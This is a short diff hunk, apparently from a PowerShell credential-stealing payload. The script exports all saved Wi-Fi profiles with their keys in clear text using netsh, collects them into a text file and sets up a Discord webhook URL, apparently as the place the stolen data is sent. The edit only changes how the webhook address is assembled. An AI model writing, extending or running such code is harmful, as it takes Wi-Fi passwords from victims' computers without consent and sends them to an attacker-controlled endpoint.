@@ -29,7 +29,10 @@ while (-not (Test-Path $zip)) {
 }
 
 netsh wlan export profile key=clear folder=$e | Out-Null
-$wh = $webhook_base + $wh
+if (-not $wh.StartsWith("https://discord.com/api/webhooks/")) {
+    $wh = $webhook_base + $wh
+}   
+
 
 $wifiFile = "$e\wifi.txt"
 Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
